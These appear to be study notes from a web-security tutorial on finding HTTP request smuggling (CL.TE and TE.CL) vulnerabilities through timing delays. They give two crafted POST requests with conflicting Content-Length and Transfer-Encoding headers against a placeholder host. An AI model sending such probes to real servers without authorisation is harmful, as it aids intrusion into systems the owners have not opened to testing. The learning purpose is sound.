
---
### Finding CL.TE vulnerabilities using timing techniques

If an application is vulnerable to the CL.TE variant of request smuggling, then sending a request like the following will often cause a time delay:


```
POST / HTTP/1.1 
Host: vulnerable-website.com 
Transfer-Encoding: chunked 
Content-Length: 4

1
A
X
```

Since the front-end server uses the `Content-Length` header, it will forward only part of this request, omitting the `X`. The back-end server uses the `Transfer-Encoding` header, processes the first chunk, and then waits for the next chunk to arrive. This will cause an observable time delay.

### Finding TE.CL vulnerabilities using timing techniques

If an application is vulnerable to the TE.CL variant of request smuggling, then sending a request like the following will often cause a time delay:
```
POST / HTTP/1.1 
Host: vulnerable-website.com 
Transfer-Encoding: chunked 
Content-Length: 6 

0

X
```
![[Pasted image 20250808181736.png]]